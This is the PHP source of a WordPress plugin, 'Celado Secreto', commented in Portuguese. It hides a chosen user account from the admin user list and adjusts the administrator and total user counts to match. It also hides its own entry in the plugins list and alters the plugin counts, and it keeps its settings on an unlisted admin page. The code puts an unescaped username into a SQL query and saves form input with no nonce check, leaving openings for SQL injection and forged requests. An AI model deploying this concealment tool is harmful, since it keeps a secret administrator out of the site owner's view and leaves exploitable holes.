<?php
/*
Plugin Name: Celado Secreto
Plugin URI: https://marcelordesigner.com/
Description: Oculta um usuário selecionado e o próprio plugin da lista de usuários e plugins.
Version: 1.0
Author: Marcelo Rocha Designer
Author URI: https://marcelordesigner.com/

Este plugin foi criado pelo Marcelo Rocha Designer com o objetivo de criar um usuário oculto no Wordpress.
*/

// Evitar mensagem de erro de saída inesperada
if ( ! defined( 'ABSPATH' ) ) {
    exit; // Sai se acessado diretamente
}

// Função para obter o usuário oculto selecionado
function get_hidden_user() {
    return get_option('hidden_user');
}

// Função para salvar o usuário oculto selecionado
function save_hidden_user($user_login) {
    update_option('hidden_user', $user_login);
}

// Ocultar usuário selecionado da lista de usuários
add_action('pre_user_query', 'site_pre_user_query');
function site_pre_user_query($user_search) {
    $hidden_user = get_hidden_user();
    if (!$hidden_user) {
        return;
    }

    global $current_user;
    $username = $current_user->user_login;
    if ($username == $hidden_user) {
        // Não faz nada se o usuário for o usuário oculto
    } else {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1',
        "WHERE 1=1 AND {$wpdb->users}.user_login != '{$hidden_user}'", $user_search->query_where);
    }
}

// Ajustar a contagem de usuários
add_filter("views_users", "site_list_table_views");
function site_list_table_views($views){
    $hidden_user = get_hidden_user();
    if (!$hidden_user) {
        return $views;
    }

    global $current_user;
    $username = $current_user->user_login;
    if ($username != $hidden_user) {
        $users = count_users();
        $admins_num = $users['avail_roles']['administrator'] - 1;
        $all_num = $users['total_users'] - 1;
        $class_adm = (strpos($views['administrator'], 'current') === false) ? "" : "current";
        $class_all = (strpos($views['all'], 'current') === false) ? "" : "current";

        $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' (' . $admins_num . ')</a>';
        $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' (' . $all_num . ')</a>';
    }
    return $views;
}

// Ocultar o plugin da lista de plugins e ajustar a contagem de plugins
add_action('admin_head', 'hide_celado_secreto_plugin');
function hide_celado_secreto_plugin() {
    $hidden_user = get_hidden_user();
    if (!$hidden_user) {
        return;
    }

    global $current_user;
    $username = $current_user->user_login;
    if ($username != $hidden_user) {
        echo '<style>
            tr[data-slug="celado-secreto"] {
                display: none;
            }
        </style>';
    }
}

// Ajustar a contagem de plugins
add_filter('views_plugins', 'adjust_plugins_count');
function adjust_plugins_count($views) {
    $hidden_user = get_hidden_user();
    if (!$hidden_user) {
        return $views;
    }

    global $current_user;
    $username = $current_user->user_login;
    if ($username != $hidden_user) {
        $all_plugins = get_plugins();
        $plugin_count = count($all_plugins) - 1;

        $class_all = (strpos($views['all'], 'current') === false) ? "" : "current";
        $views['all'] = '<a href="plugins.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $plugin_count . ')</span></a>';

        if (isset($views['active'])) {
            $active_count = substr($views['active'], strpos($views['active'], '(') + 1, -1) - 1;
            $views['active'] = preg_replace('/\(\d+\)/', '(' . $active_count . ')', $views['active']);
        }

        if (isset($views['inactive'])) {
            $inactive_count = substr($views['inactive'], strpos($views['inactive'], '(') + 1, -1) - 1;
            $views['inactive'] = preg_replace('/\(\d+\)/', '(' . $inactive_count . ')', $views['inactive']);
        }

        if (isset($views['recently_activated'])) {
            $recently_activated_count = substr($views['recently_activated'], strpos($views['recently_activated'], '(') + 1, -1) - 1;
            $views['recently_activated'] = preg_replace('/\(\d+\)/', '(' . $recently_activated_count . ')', $views['recently_activated']);
        }

        if (isset($views['auto-update-enabled'])) {
            $auto_update_enabled_count = substr($views['auto-update-enabled'], strpos($views['auto-update-enabled'], '(') + 1, -1) - 1;
            $views['auto-update-enabled'] = preg_replace('/\(\d+\)/', '(' . $auto_update_enabled_count . ')', $views['auto-update-enabled']);
        }

        if (isset($views['auto-update-disabled'])) {
            $auto_update_disabled_count = substr($views['auto-update-disabled'], strpos($views['auto-update-disabled'], '(') + 1, -1) - 1;
            $views['auto-update-disabled'] = preg_replace('/\(\d+\)/', '(' . $auto_update_disabled_count . ')', $views['auto-update-disabled']);
        }
    }
    return $views;
}

// Adicionar link secreto para acessar configurações do plugin
add_action('admin_menu', 'celado_secreto_menu');
function celado_secreto_menu() {
    add_submenu_page(
        null, // Não adiciona no menu principal
        'Celado Secreto', 
        'Celado Secreto', 
        'manage_options', 
        'celado-secreto', 
        'celado_secreto_settings_page'
    );
}

function celado_secreto_settings_page() {
    $users = get_users(array('fields' => array('ID', 'user_login'), 'orderby' => 'user_login', 'order' => 'ASC'));
    $hidden_user = get_hidden_user();
    global $current_user;

    if (isset($_POST['hidden_user'])) {
        save_hidden_user($_POST['hidden_user']);
        $hidden_user = $_POST['hidden_user'];
        echo '<div class="updated"><p>O usuário oculto foi atualizado.</p></div>';
    }

    if (isset($_POST['desativar_plugin'])) {
        deactivate_plugins(plugin_basename(__FILE__));
        echo '<div class="updated"><p>O plugin foi desativado.</p></div>';
    }

    echo '<div class="wrap">
        <h1>Configurações do Celado Secreto</h1>
        <form method="post">
            <table class="form-table">
                <tr valign="top">
                    <th scope="row">Selecionar Usuário Oculto</th>
                    <td>
                        <select name="hidden_user">
                            <option value="">Nenhum</option>';
                            foreach ($users as $user) {
                                $selected = ($user->user_login == $hidden_user) ? 'selected="selected"' : '';
                                echo '<option value="' . $user->user_login . '" ' . $selected . '>' . $user->user_login . '</option>';
                            }
                        echo '</select>
                    </td>
                </tr>
            </table>
            <p><input type="submit" value="Salvar Configurações" class="button button-primary" /></p>
        </form>';
        
    if ($current_user->user_login == $hidden_user) {
        echo '<form method="post">
            <input type="hidden" name="desativar_plugin" value="1" />
            <p><input type="submit" value="Desativar Plugin" class="button button-primary" /></p>
        </form>';
    }
    
    echo '</div>';
}
?>
